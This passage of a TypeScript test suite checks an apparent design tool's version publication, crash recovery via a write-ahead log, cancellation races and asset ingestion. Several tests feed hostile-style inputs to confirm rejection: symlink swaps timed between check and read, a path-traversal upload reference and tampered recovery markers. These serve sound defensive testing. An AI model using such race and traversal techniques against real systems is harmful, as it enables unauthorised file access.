      ), /changed|invalid|unsafe|unavailable/i);
      assert.equal(substituted, true);
    } finally {
      await rm(dataDir, { recursive: true, force: true });
    }
  });

  await t.test("pinned Asset", async () => {
    const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-portable-asset-toctou-"));
    const projectId = "project-portable-asset-toctou";
    try {
      await initializeDesignProject(dataDir, projectId);
      const bytes = Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        Buffer.from("same-byte portable asset"),
      ]);
      const asset = await storeDesignAsset(dataDir, projectId, {
        name: "portable.png",
        mimeType: "image/png",
        base64: bytes.toString("base64"),
      });
      await mutateDesignCanvas(dataDir, projectId, {
        expectedRevision: 0,
        intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
      });
      const published = await publishDesignVersion(dataDir, projectId, {
        nodeId: "node-page",
        html: `<!doctype html><html><head><title>Portable asset race</title></head><body><img alt="" src="dezin-asset://${asset.id}"></body></html>`,
        contextHash: "e".repeat(64),
        canvasRevision: 1,
        expectedHeadVersionId: null,
        jobId: null,
        runnerId: "fixture",
        model: null,
      });
      const payload = await resolveDesignAssetFile(dataDir, projectId, asset.id, asset.fileName);
      const replacement = join(dataDir, "same-asset.png");
      await writeFile(replacement, bytes);
      let substituted = false;

      await assert.rejects(buildPortableDesignVersionHtml(
        dataDir,
        projectId,
        "node-page",
        published.manifest.id,
        {
          beforeAssetPayloadRead: async () => {
            substituted = true;
            await rm(payload.path, { force: true });
            await symlink(replacement, payload.path);
          },
        },
      ), /changed|invalid|unsafe|unavailable/i);
      assert.equal(substituted, true);
    } finally {
      await rm(dataDir, { recursive: true, force: true });
    }
  });
});

test("a cancelled generation Job cannot publish its staged Version", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-cancelled-publication-"));
  const projectId = "project-cancelled-publication";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const created = await createDesignJob(dataDir, projectId, {
      kind: "node-generation",
      ...FIXTURE_JOB_IDENTITY,
      nodeId: "node-page",
    });
    await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" });
    await updateDesignJob(dataDir, projectId, created.job.id, { status: "validating" });
    await cancelDesignJob(dataDir, projectId, created.job.id);

    await assert.rejects(
      publishDesignVersion(dataDir, projectId, {
        nodeId: "node-page",
        html: "<!doctype html><html><head></head><body>cancelled</body></html>",
        contextHash: created.job.contextHash!,
        canvasRevision: created.job.canvasRevision!,
        expectedHeadVersionId: created.job.expectedHeadVersionId,
        jobId: created.job.id,
        runnerId: created.job.runnerId,
        model: created.job.model,
      }),
      /active validating|cancelled|publication authority/i,
    );
    assert.equal((await getDesignJob(dataDir, projectId, created.job.id)).status, "cancelled");
    assert.equal((await getDesignCanvas(dataDir, projectId)).nodes[0]?.currentVersionId, null);
    assert.deepEqual(await listDesignVersions(dataDir, projectId, "node-page"), []);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("publishing a generation Version terminalizes its Job before cancellation can interleave", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-publication-boundary-"));
  const projectId = "project-publication-boundary";
  try {
    await initializeDesignProject(dataDir, projectId);
    await mutateDesignCanvas(dataDir, projectId, {
      expectedRevision: 0,
      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
    });
    const created = await createDesignJob(dataDir, projectId, {
      kind: "node-generation",
      ...FIXTURE_JOB_IDENTITY,
      nodeId: "node-page",
    });
    await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" });
    await updateDesignJob(dataDir, projectId, created.job.id, { status: "validating" });

    const published = await publishDesignVersion(dataDir, projectId, {
      nodeId: "node-page",
      html: "<!doctype html><html><head></head><body>ready</body></html>",
      contextHash: created.job.contextHash!,
      canvasRevision: created.job.canvasRevision!,
      expectedHeadVersionId: created.job.expectedHeadVersionId,
      jobId: created.job.id,
      runnerId: created.job.runnerId,
      model: created.job.model,
    });
    const cancelledAfterPublish = await cancelDesignJob(dataDir, projectId, created.job.id);

    assert.equal(cancelledAfterPublish.status, "ready");
    assert.equal(cancelledAfterPublish.cancelRequested, false);
    assert.equal(cancelledAfterPublish.versionId, published.manifest.id);
    assert.equal((await getDesignCanvas(dataDir, projectId)).nodes[0]?.currentVersionId, published.manifest.id);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("publication WAL recovers every durable crash phase without leaving single-flight ownership", async () => {
  const phases: DesignVersionPublicationPhase[] = ["marker", "pending", "target", "canvas", "job"];
  for (const [phaseIndex, phase] of phases.entries()) {
    const fixture = await validatingPublicationFixture(phase);
    try {
      await assert.rejects(
        publishDesignVersion(fixture.dataDir, fixture.projectId, {
          nodeId: "node-page",
          html: `<!doctype html><html><head></head><body>${phase}</body></html>`,
          contextHash: fixture.job.contextHash!,
          canvasRevision: fixture.job.canvasRevision!,
          expectedHeadVersionId: fixture.job.expectedHeadVersionId,
          jobId: fixture.job.id,
          runnerId: fixture.job.runnerId,
          model: fixture.job.model,
        }, 1_000 + phaseIndex, {
          simulateProcessCrash: true,
          afterPhase: async (completed) => {
            if (phase === "marker" && completed === "marker") {
              const markerPath = join(
                fixture.dataDir,
                "projects",
                fixture.projectId,
                "design",
                "transactions",
                "publications",
                `${fixture.job.id}.json`,
              );
              const marker = JSON.parse(await readFile(markerPath, "utf8"));
              assert.equal(marker.projectId, fixture.projectId);
              assert.equal(marker.jobId, fixture.job.id);
              assert.equal(marker.nodeId, "node-page");
              assert.equal(marker.manifest.jobId, fixture.job.id);
              assert.equal(marker.manifest.runnerId, fixture.job.runnerId);
              assert.equal(marker.manifest.model, fixture.job.model);
              assert.equal(marker.manifest.contextHash, fixture.job.contextHash);
              assert.match(marker.manifest.checksum, /^[a-f0-9]{64}$/);
              assert.ok(marker.manifest.bytes > 0);
              assert.match(marker.checksum, /^[a-f0-9]{64}$/);
            }
            if (completed === phase) throw new Error(`simulated crash after ${phase}`);
          },
        }),
        new RegExp(`simulated crash after ${phase}`),
      );

      await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 2_000 + phaseIndex);
      const job = await getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id);
      const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
      const versions = await listDesignVersions(fixture.dataDir, fixture.projectId, "node-page");
      if (phase === "marker") {
        assert.equal(job.status, "cancelled");
        assert.equal(canvas.nodes[0]?.currentVersionId, null);
        assert.deepEqual(versions, []);
      } else {
        assert.equal(job.status, "ready");
        assert.equal(versions.length, 1);
        assert.equal(job.versionId, versions[0]?.id);
        assert.equal(canvas.nodes[0]?.currentVersionId, versions[0]?.id);
      }
      assert.equal(canvas.nodes[0]?.activeJobId, null);
      assert.deepEqual(
        await readdir(join(fixture.dataDir, "projects", fixture.projectId, "design", "transactions", "publications")),
        [],
      );
      const next = await createDesignJob(fixture.dataDir, fixture.projectId, {
        kind: "node-generation",
        ...FIXTURE_JOB_IDENTITY,
        nodeId: "node-page",
      });
      await cancelDesignJob(fixture.dataDir, fixture.projectId, next.job.id);
      assert.deepEqual(await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 3_000 + phaseIndex), []);
    } finally {
      await rm(fixture.dataDir, { recursive: true, force: true });
    }
  }
});

test("publication recovery accepts a checksum-valid pre-title WAL and preserves the Node name", async () => {
  const fixture = await validatingPublicationFixture("legacy-title-wal");
  const markerPath = join(
    fixture.dataDir,
    "projects",
    fixture.projectId,
    "design",
    "transactions",
    "publications",
    `${fixture.job.id}.json`,
  );
  try {
    await assert.rejects(
      publishDesignVersion(fixture.dataDir, fixture.projectId, {
        nodeId: "node-page",
        html: "<!doctype html><html><head><title>Legacy generated title</title></head><body>legacy WAL</body></html>",
        contextHash: fixture.job.contextHash!,
        canvasRevision: fixture.job.canvasRevision!,
        expectedHeadVersionId: fixture.job.expectedHeadVersionId,
        jobId: fixture.job.id,
        runnerId: fixture.job.runnerId,
        model: fixture.job.model,
      }, 4_000, {
        simulateProcessCrash: true,
        afterPhase(phase) {
          if (phase === "pending") throw new Error("simulated legacy daemon exit");
        },
      }),
      /simulated legacy daemon exit/,
    );

    const marker = JSON.parse(await readFile(markerPath, "utf8")) as Record<string, unknown>;
    delete marker.nodeNameBefore;
    delete marker.nodeNameAfter;
    delete marker.checksum;
    marker.checksum = createHash("sha256").update(stableStringify(marker), "utf8").digest("hex");
    await writeFile(markerPath, `${JSON.stringify(marker, null, 2)}\n`);

    await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 5_000);
    const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
    const recovered = await getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id);
    assert.equal(recovered.status, "ready");
    assert.equal(canvas.nodes[0]?.name, "Page");
    assert.equal(canvas.nodes[0]?.versionCount, 1);
    assert.equal(canvas.nodes[0]?.currentVersionId, recovered.versionId);
    assert.deepEqual(await readdir(join(markerPath, "..")), []);
  } finally {
    await rm(fixture.dataDir, { recursive: true, force: true });
  }
});

test("live publication recovery keeps a queued Canvas mutation behind the same project lock", async () => {
  const fixture = await validatingPublicationFixture("queued-mutation");
  try {
    const before = await getDesignCanvas(fixture.dataDir, fixture.projectId);
    let queuedMutation: Promise<{ ok: true } | { ok: false; error: unknown }> | undefined;
    const published = await publishDesignVersion(fixture.dataDir, fixture.projectId, {
      nodeId: "node-page",
      html: "<!doctype html><html><head></head><body>publish before queued mutation</body></html>",
      contextHash: fixture.job.contextHash!,
      canvasRevision: fixture.job.canvasRevision!,
      expectedHeadVersionId: fixture.job.expectedHeadVersionId,
      jobId: fixture.job.id,
      runnerId: fixture.job.runnerId,
      model: fixture.job.model,
    }, 8_000, {
      afterPhase(phase) {
        if (phase !== "pending") return;
        queuedMutation = mutateDesignCanvas(fixture.dataDir, fixture.projectId, {
          expectedRevision: before.revision,
          intents: [{ type: "add-node", node: { id: "node-other", kind: "research" } }],
        }).then(() => ({ ok: true as const }), (error: unknown) => ({ ok: false as const, error }));
        throw new Error("injected live failure after the complete pending payload");
      },
    });

    assert.equal(published.job?.status, "ready");
    assert.equal(published.job?.versionId, published.manifest.id);
    assert.ok(queuedMutation);
    const mutation = await queuedMutation;
    assert.equal(mutation.ok, false);
    if (!mutation.ok) assert.ok(mutation.error instanceof DesignRevisionConflictError);
    const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
    assert.equal(canvas.nodes.some((node) => node.id === "node-other"), false);
    assert.equal(canvas.nodes[0]?.currentVersionId, published.manifest.id);
    assert.deepEqual(
      await readdir(join(fixture.dataDir, "projects", fixture.projectId, "design", "transactions", "publications")),
      [],
    );
  } finally {
    await rm(fixture.dataDir, { recursive: true, force: true });
  }
});

test("live publication recovery terminalizes before a queued cancellation can overtake it", async () => {
  const fixture = await validatingPublicationFixture("queued-cancel");
  try {
    let queuedCancellation: Promise<Awaited<ReturnType<typeof cancelDesignJob>>> | undefined;
    const published = await publishDesignVersion(fixture.dataDir, fixture.projectId, {
      nodeId: "node-page",
      html: "<!doctype html><html><head></head><body>publish before queued cancel</body></html>",
      contextHash: fixture.job.contextHash!,
      canvasRevision: fixture.job.canvasRevision!,
      expectedHeadVersionId: fixture.job.expectedHeadVersionId,
      jobId: fixture.job.id,
      runnerId: fixture.job.runnerId,
      model: fixture.job.model,
    }, 8_100, {
      afterPhase(phase) {
        if (phase !== "pending") return;
        queuedCancellation = cancelDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id, 8_200);
        throw new Error("injected live failure before queued cancellation");
      },
    });

    assert.equal(published.job?.status, "ready");
    assert.ok(queuedCancellation);
    assert.equal((await queuedCancellation).status, "ready");
    const job = await getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id);
    const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
    assert.equal(job.status, "ready");
    assert.equal(canvas.nodes[0]?.state, "ready");
    assert.equal(canvas.nodes[0]?.activeJobId, null);
    assert.deepEqual(
      await readdir(join(fixture.dataDir, "projects", fixture.projectId, "design", "transactions", "publications")),
      [],
    );
  } finally {
    await rm(fixture.dataDir, { recursive: true, force: true });
  }
});

test("a durable publication marker is a project-wide write barrier until recovery succeeds", async () => {
  const fixture = await validatingPublicationFixture("write-barrier");
  try {
    const before = await getDesignCanvas(fixture.dataDir, fixture.projectId);
    await assert.rejects(
      publishDesignVersion(fixture.dataDir, fixture.projectId, {
        nodeId: "node-page",
        html: "<!doctype html><html><head></head><body>durable crash marker</body></html>",
        contextHash: fixture.job.contextHash!,
        canvasRevision: fixture.job.canvasRevision!,
        expectedHeadVersionId: fixture.job.expectedHeadVersionId,
        jobId: fixture.job.id,
        runnerId: fixture.job.runnerId,
        model: fixture.job.model,
      }, 8_300, {
        simulateProcessCrash: true,
        afterPhase(phase) {
          if (phase === "pending") throw new Error("simulated process exit with a complete pending payload");
        },
      }),
      /simulated process exit/i,
    );

    await assert.rejects(
      mutateDesignCanvas(fixture.dataDir, fixture.projectId, {
        expectedRevision: before.revision,
        intents: [{ type: "add-node", node: { id: "node-overtake", kind: "research" } }],
      }),
      /publication.*recover|recover.*publication/i,
    );
    await assert.rejects(
      cancelDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id, 8_400),
      /publication.*recover|recover.*publication/i,
    );
    const persistedWhileBlocked = JSON.parse(await readFile(
      join(fixture.dataDir, "projects", fixture.projectId, "design", "project.json"),
      "utf8",
    ));
    assert.equal(persistedWhileBlocked.revision, before.revision);

    const recovered = await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 8_500);
    assert.equal(recovered.find((job) => job.id === fixture.job.id)?.status, "ready");
    const after = await getDesignCanvas(fixture.dataDir, fixture.projectId);
    assert.equal(after.nodes[0]?.activeJobId, null);
    assert.equal(after.nodes[0]?.state, "ready");
  } finally {
    await rm(fixture.dataDir, { recursive: true, force: true });
  }
});

test("a durable publication marker blocks every public Version and Job read until recovery", async () => {
  for (const crashPhase of ["target", "job"] as const) {
    const fixture = await validatingPublicationFixture(`read-barrier-${crashPhase}`);
    try {
      await assert.rejects(
        publishDesignVersion(fixture.dataDir, fixture.projectId, {
          nodeId: "node-page",
          html: `<!doctype html><html><head></head><body>crash after ${crashPhase}</body></html>`,
          contextHash: fixture.job.contextHash!,
          canvasRevision: fixture.job.canvasRevision!,
          expectedHeadVersionId: fixture.job.expectedHeadVersionId,
          jobId: fixture.job.id,
          runnerId: fixture.job.runnerId,
          model: fixture.job.model,
        }, 8_600, {
          simulateProcessCrash: true,
          afterPhase(phase) {
            if (phase === crashPhase) throw new Error(`simulated process exit after ${crashPhase}`);
          },
        }),
        new RegExp(`simulated process exit after ${crashPhase}`),
      );

      const designDir = join(fixture.dataDir, "projects", fixture.projectId, "design");
      const marker = JSON.parse(await readFile(
        join(designDir, "transactions", "publications", `${fixture.job.id}.json`),
        "utf8",
      ));
      const versionId = marker.manifest.id as string;
      const blockedReads = [
        () => getDesignCanvas(fixture.dataDir, fixture.projectId),
        () => listDesignVersions(fixture.dataDir, fixture.projectId, "node-page"),
        () => getDesignVersion(fixture.dataDir, fixture.projectId, "node-page", versionId),
        () => resolveDesignVersionFile(fixture.dataDir, fixture.projectId, "node-page", versionId, "index.html"),
        () => getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id),
        () => listDesignJobs(fixture.dataDir, fixture.projectId),
      ];
      for (const read of blockedReads) {
        await assert.rejects(read(), /publication recovery must complete/i);
      }

      await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 8_700);
      const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
      const versions = await listDesignVersions(fixture.dataDir, fixture.projectId, "node-page");
      const version = await getDesignVersion(fixture.dataDir, fixture.projectId, "node-page", versionId);
      const resolved = await resolveDesignVersionFile(
        fixture.dataDir,
        fixture.projectId,
        "node-page",
        versionId,
        "index.html",
      );
      const job = await getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id);
      const jobs = await listDesignJobs(fixture.dataDir, fixture.projectId);
      assert.equal(canvas.nodes[0]?.currentVersionId, versionId);
      assert.deepEqual(versions.map((candidate) => candidate.id), [versionId]);
      assert.equal(version.id, versionId);
      assert.equal(resolved.manifest.id, versionId);
      assert.equal(job.status, "ready");
      assert.ok(jobs.some((candidate) => candidate.id === fixture.job.id && candidate.status === "ready"));
    } finally {
      await rm(fixture.dataDir, { recursive: true, force: true });
    }
  }
});

test("publication recovery rejects a corrupt marker and safely rolls back a mismatched pending payload", async () => {
  for (const corruption of ["marker", "payload"] as const) {
    const fixture = await validatingPublicationFixture(`corrupt-${corruption}`);
    try {
      const crashPhase: DesignVersionPublicationPhase = corruption === "marker" ? "marker" : "pending";
      await assert.rejects(
        publishDesignVersion(fixture.dataDir, fixture.projectId, {
          nodeId: "node-page",
          html: "<!doctype html><html><head></head><body>immutable</body></html>",
          contextHash: fixture.job.contextHash!,
          canvasRevision: fixture.job.canvasRevision!,
          expectedHeadVersionId: fixture.job.expectedHeadVersionId,
          jobId: fixture.job.id,
          runnerId: fixture.job.runnerId,
          model: fixture.job.model,
        }, 4_000, {
          simulateProcessCrash: true,
          afterPhase: (completed) => {
            if (completed === crashPhase) throw new Error(`simulated ${corruption} crash`);
          },
        }),
        /simulated.*crash/i,
      );
      const designDir = join(fixture.dataDir, "projects", fixture.projectId, "design");
      if (corruption === "marker") {
        const markerPath = join(designDir, "transactions", "publications", `${fixture.job.id}.json`);
        const marker = JSON.parse(await readFile(markerPath, "utf8"));
        marker.followsHead = !marker.followsHead;
        await writeFile(markerPath, `${JSON.stringify(marker, null, 2)}\n`);
      } else {
        const pendingVersions = await readdir(join(designDir, "nodes", "node-page", ".pending", "versions"));
        assert.equal(pendingVersions.length, 1);
        await writeFile(
          join(designDir, "nodes", "node-page", ".pending", "versions", pendingVersions[0]!, "index.html"),
          "tampered",
        );
      }

      if (corruption === "marker") {
        await assert.rejects(
          recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 5_000),
          /corrupt|checksum|payload|invalid/i,
        );
      } else {
        const recovered = await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 5_000);
        assert.equal(recovered.find((job) => job.id === fixture.job.id)?.status, "cancelled");
      }
      if (corruption === "marker") {
        // A corrupt durable marker intentionally keeps authoritative Canvas
        // reads and every mutation behind the recovery barrier. Inspect the
        // bytes directly here because the Canvas head cannot yet be proven.
        await assert.rejects(
          getDesignCanvas(fixture.dataDir, fixture.projectId),
          /publication recovery must complete/i,
        );
        await assert.rejects(
          listDesignVersions(fixture.dataDir, fixture.projectId, "node-page"),
          /publication recovery must complete/i,
        );
        const storedProject = JSON.parse(await readFile(join(designDir, "project.json"), "utf8"));
        assert.equal(storedProject.nodes[0]?.currentVersionId, null);
        const storedJob = JSON.parse(await readFile(join(designDir, "jobs", `${fixture.job.id}.json`), "utf8"));
        assert.equal(storedJob.status, "validating");
      } else {
        assert.equal((await getDesignCanvas(fixture.dataDir, fixture.projectId)).nodes[0]?.currentVersionId, null);
        assert.deepEqual(await listDesignVersions(fixture.dataDir, fixture.projectId, "node-page"), []);
        assert.equal((await getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id)).status, "cancelled");
      }
    } finally {
      await rm(fixture.dataDir, { recursive: true, force: true });
    }
  }
});

test("publication recovery rolls back a crash during pending payload construction", async () => {
  for (const crashPoint of ["directory", "index"] as const) {
    const fixture = await validatingPublicationFixture(`mid-pending-${crashPoint}`);
    try {
      await assert.rejects(
        publishDesignVersion(fixture.dataDir, fixture.projectId, {
          nodeId: "node-page",
          html: "<!doctype html><html><head></head><body>partial</body></html>",
          contextHash: fixture.job.contextHash!,
          canvasRevision: fixture.job.canvasRevision!,
          expectedHeadVersionId: fixture.job.expectedHeadVersionId,
          jobId: fixture.job.id,
          runnerId: fixture.job.runnerId,
          model: fixture.job.model,
        }, 6_000, {
          simulateProcessCrash: true,
          afterPendingDirectory() {
            if (crashPoint === "directory") throw new Error("crash after pending directory");
          },
          afterPendingIndex() {
            if (crashPoint === "index") throw new Error("crash after pending index");
          },
        }),
        /crash after pending/,
      );

      const recovered = await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 7_000);
      assert.equal(recovered.find((job) => job.id === fixture.job.id)?.status, "cancelled");
      const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
      assert.equal(canvas.nodes[0]?.activeJobId, null);
      assert.equal(canvas.nodes[0]?.currentVersionId, null);
      assert.deepEqual(await listDesignVersions(fixture.dataDir, fixture.projectId, "node-page"), []);
      assert.deepEqual(
        await readdir(join(fixture.dataDir, "projects", fixture.projectId, "design", "transactions", "publications")),
        [],
      );
      assert.deepEqual(
        await readdir(join(fixture.dataDir, "projects", fixture.projectId, "design", "nodes", "node-page", ".pending", "versions")),
        [],
      );
    } finally {
      await rm(fixture.dataDir, { recursive: true, force: true });
    }
  }
});

test("Design assets are project-owned, content-addressed, and can ingest an existing safe ref", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-assets-"));
  const projectId = "project-assets";
  try {
    await initializeDesignProject(dataDir, projectId);
    const bytes = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.from("a stable image payload"),
    ]);
    const first = await storeDesignAsset(dataDir, projectId, {
      name: "hero image.png",
      mimeType: "image/png",
      base64: bytes.toString("base64"),
    }, 200);
    assert.match(first.id, /^asset-[a-f0-9]{32}$/);
    assert.equal(first.bytes, bytes.length);

    const refs = join(dataDir, "projects", projectId, ".refs");
    await mkdir(refs, { recursive: true });
    await writeFile(join(refs, "hero.png"), bytes);
    const second = await storeDesignAsset(dataDir, projectId, {
      name: "hero image.png",
      mimeType: "image/png",
      uploadedFileId: ".refs/hero.png",
    });
    assert.equal(second.id, first.id);

    const largeVideoBytes = MAX_DESIGN_ASSET_BYTES + 1;
    const largeVideoPath = join(refs, "large-video.mp4");
    const largeVideoHandle = await open(largeVideoPath, "w");
    try {
      await largeVideoHandle.write(Buffer.from("video"), 0, 5, 0);
      await largeVideoHandle.truncate(largeVideoBytes);
    } finally {
      await largeVideoHandle.close();
    }
    const largeVideo = await storeDesignAsset(dataDir, projectId, {
      name: "large-video.mp4",
      mimeType: "video/mp4",
      uploadedFileId: ".refs/large-video.mp4",
    });
    assert.equal(largeVideo.bytes, largeVideoBytes);
    const resolvedVideo = await resolveDesignAssetFile(
      dataDir,
      projectId,
      largeVideo.id,
      largeVideo.fileName,
    );
    assert.equal((await stat(resolvedVideo.path)).size, largeVideoBytes);

    const served = await resolveDesignAssetFile(dataDir, projectId, first.id, first.fileName);
    assert.deepEqual(await readFile(served.path), bytes);
    assert.equal(served.manifest.checksum, first.checksum);

    const beforeCanvas = await getDesignCanvas(dataDir, projectId);
    await assert.rejects(importDesignCanvasAssetBatch(dataDir, projectId, {
      expectedRevision: beforeCanvas.revision,
      items: [{
        asset: { name: "hero image.png", mimeType: "image/png", base64: bytes.toString("base64") },
        binding: { type: "create-node", node: { id: "bad-video", kind: "video" } },
      }],
    }), /mimeType.*kind/i);
    await assert.rejects(
      mutateDesignCanvas(dataDir, projectId, {
        expectedRevision: beforeCanvas.revision,
        intents: [{ type: "add-node", node: { id: "missing-image", kind: "image", assetId: "asset-00000000000000000000000000000000" } }],
      }),
      /atomic Asset import API/i,
    );

    await assert.rejects(
      storeDesignAsset(dataDir, projectId, {
        name: "escape.png",
        mimeType: "image/png",
        uploadedFileId: ".refs/../escape.png",
      }),
      /uploadedFileId/i,
    );
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("uploaded Asset ingestion rejects same-byte path substitution before reading the reference", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-upload-toctou-"));
  const projectId = "project-upload-toctou";
  try {
    await initializeDesignProject(dataDir, projectId);
    const bytes = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.from("same-byte uploaded asset"),
    ]);
    const refs = join(dataDir, "projects", projectId, ".refs");
    const source = join(refs, "race.png");
    const replacement = join(dataDir, "same-upload.png");
    await mkdir(refs, { recursive: true });
    await writeFile(source, bytes);
    await writeFile(replacement, bytes);
    let substituted = false;

    await assert.rejects(storeDesignAsset(dataDir, projectId, {
      name: "race.png",
      mimeType: "image/png",
      uploadedFileId: ".refs/race.png",
    }, undefined, {
      beforeUploadedPayloadOpen: async () => {
        substituted = true;
        await rm(source, { force: true });
        await symlink(replacement, source);
      },
    }), /unsafe|unavailable|changed|regular file/i);
    assert.equal(substituted, true);
    assert.deepEqual(await listDesignAssets(dataDir, projectId), []);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("large canonical base64 Assets do not overflow the JavaScript call stack", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-large-base64-"));
  const projectId = "project-large-base64";
  try {
    await initializeDesignProject(dataDir, projectId);
    const bytes = Buffer.alloc(4 * 1024 * 1024 + 8, 0x61);
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(bytes);
    const stored = await storeDesignAsset(dataDir, projectId, {
      name: "large.png",
      mimeType: "image/png",
      base64: bytes.toString("base64"),
    });
    assert.equal(stored.bytes, bytes.length);
    const resolved = await resolveDesignAssetFile(dataDir, projectId, stored.id, stored.fileName);
    assert.deepEqual(await readFile(resolved.path), bytes);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("Asset batches atomically bind material Nodes, roll back failures, and recover crash WAL state", async () => {
  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-asset-batch-"));
  const projectId = "project-asset-batch";
  const png = Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    Buffer.from("bounded batch image"),
  ]);
  try {
    await initializeDesignProject(dataDir, projectId);
    const existing = await storeDesignAsset(dataDir, projectId, {
      name: "existing.png",
      mimeType: "image/png",
      base64: png.toString("base64"),
    });

    await assert.rejects(importDesignCanvasAssetBatch(dataDir, projectId, {
      expectedRevision: 0,
      items: [
        {
          asset: { name: "new-before-failure.png", mimeType: "image/png", base64: png.toString("base64") },
          binding: { type: "create-node", node: { id: "node-new-before-failure", kind: "image" } },
        },
        {
          asset: { name: "invalid.png", mimeType: "image/png", base64: "not-canonical-base64" },
          binding: { type: "create-node", node: { id: "node-invalid", kind: "image" } },
        },
      ],
    }), /base64/i);
    assert.equal((await getDesignCanvas(dataDir, projectId)).revision, 0);
    assert.deepEqual((await getDesignCanvas(dataDir, projectId)).nodes, []);
    assert.deepEqual((await listDesignAssets(dataDir, projectId)).map((asset) => asset.id), [existing.id]);

    const imported = await importDesignCanvasAssetBatch(dataDir, projectId, {
      expectedRevision: 0,
      items: [
        {
          asset: { name: "hero.png", mimeType: "image/png", base64: png.toString("base64") },
          binding: { type: "create-node", node: { id: "node-hero", kind: "image", name: "Hero", geometry: { x: 20, y: 40 } } },
        },
        {
          asset: { name: "detail.png", mimeType: "image/png", base64: png.toString("base64") },
          binding: { type: "create-node", node: { id: "node-detail", kind: "image", name: "Detail", geometry: { x: 420, y: 40 } } },
        },
      ],
    }, 500);
    assert.equal(imported.revision, 1);
    assert.equal(imported.undoDepth, 1);
    assert.deepEqual(imported.nodes.map((node) => ({ id: node.id, state: node.state })), [
      { id: "node-hero", state: "ready" },
      { id: "node-detail", state: "ready" },
    ]);
    assert.equal((await listDesignAssets(dataDir, projectId)).length, 3);

    const crashPng = Buffer.concat([png, Buffer.from(" crash-only")]);
    await assert.rejects(importDesignCanvasAssetBatch(dataDir, projectId, {
      expectedRevision: 1,
      items: [{
        asset: { name: "crash-orphan.png", mimeType: "image/png", base64: crashPng.toString("base64") },
        binding: { type: "create-node", node: { id: "node-never-committed", kind: "image" } },
      }],
    }, 600, {
      simulateProcessCrash: true,
      afterPhase: (phase) => {
        if (phase === "marker") throw new Error("simulated import crash after marker");
      },
    }), /simulated import crash/);

    const recovered = await getDesignCanvas(dataDir, projectId);
    assert.equal(recovered.revision, 1);
    assert.ok(!recovered.nodeOrder.includes("node-never-committed"));
    assert.ok(!(await listDesignAssets(dataDir, projectId)).some((asset) => asset.name === "crash-orphan.png"));
    const transactions = await readdir(join(dataDir, "projects", projectId, "design", "assets", ".transactions"));
    assert.deepEqual(transactions, []);
  } finally {
    await rm(dataDir, { recursive: true, force: true });
  }
});

test("idempotent Asset batches replay the exact committed Canvas and recover commit-receipt crashes", async (t) => {
  for (const phase of ["marker", "assets", "versions", "canvas", "receipt"] as const) {
    await t.test(phase, async () => {
      const dataDir = await mkdtemp(join(tmpdir(), `dezin-design-asset-receipt-${phase}-`));
      const projectId = `project-asset-receipt-${phase}`;
      const bytes = Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        Buffer.from(`idempotent asset ${phase}`),
      ]);
      const input = {
        idempotencyKey: `bootstrap-assets-${phase}`,
        requestHash: createHash("sha256").update(`request-${phase}`).digest("hex"),
        items: [{
          asset: { name: `${phase}.png`, mimeType: "image/png", base64: bytes.toString("base64") },
          binding: { type: "create-node" as const, node: { id: `node-${phase}`, kind: "image" as const } },
        }],
      };
      try {
        await initializeDesignProject(dataDir, projectId);
        const durablePhases: string[] = [];
        await assert.rejects(
          Reflect.apply(ensureDesignCanvasAssetBatch, undefined, [dataDir, projectId, input, 100, {
            simulateProcessCrash: true,
            afterDurablePhase: (completed: string) => {
              durablePhases.push(completed);
            },
            afterPhase: (completed: string) => {
